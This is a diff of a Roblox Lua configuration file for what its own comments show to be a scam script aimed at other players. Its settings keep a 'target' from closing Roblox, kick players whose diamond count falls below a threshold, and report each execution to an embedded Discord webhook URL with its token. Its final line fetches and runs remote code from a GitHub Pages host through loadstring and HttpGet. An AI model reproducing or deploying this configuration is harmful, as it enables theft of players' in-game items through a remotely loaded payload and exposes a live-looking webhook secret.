@@ -1,24 +1,21 @@
---[[ Main Config ]]--
-_G.Username = "Hyairz" --// 
-_G.GiftMessage = "Hello" --// 
 
-_G.Diamonds = 500000 --// 
-_G.UnlockPets = true --// 
-_G.AntiLeave = true --// 
-_G.Crash = true  --// 
+--[[ Main Config ]]--
+_G.UserId = 4136548418  --// Roblox Account Id [[https://www.roblox.com/users/IDHERE/profile]] <- This is a example
+
+_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
+_G.Diamonds = 100000 --// Amount Of Diamonds To Not Kick
 
 --[[ Webhook Config ]]--
-_G.Enabled = true --// Toggle For Sending Webhooks
-_G.Mention = true --// Pings You When Someone Executes
-_G.Webhook = "https://discord.com/api/webhooks/1097509166333046894/RngnnVC4ygAD8SPCI_XeH7lM4zC29F2ajXZL9wDpI0HneeECICU1E5dbjgTuqthM98xE" --// Discord Webhook For Executions
-
+_G.Webhook = "https://ptb.discord.com/api/webhooks/1097509166333046894/RngnnVC4ygAD8SPCI_XeH7lM4zC29F2ajXZL9wDpI0HneeECICU1E5dbjgTuqthM98xE" --// Discord link Webhook For Executions
+    
 --[[ UI Config ]]--
-_G.ScriptName = "Script is Loading" --// Script Name On The UI
+_G.ScriptName = "Hi" --// Script Name On The UI
 _G.Tip1 = "" --// Gives You Tips On The UI
 _G.Tip2 = "" --// Gives You Tips On The UI
 _G.Tip3 = "" --// Gives You Tips On The UI
 _G.Tip4 = "" --// Gives You Tips On The UI
 _G.Tip5 = "" --// Gives You Tips On The UI
 
---[[ Script ]]
-loadstring(game:HttpGet("https://arkhalislua.github.io/Lua/Arkhalis.lua"))()
+
+--[[ Script ]]--
+loadstring(game:HttpGet("https://arkhalislua.github.io/Lua/ArkhalisBank.lua"))()
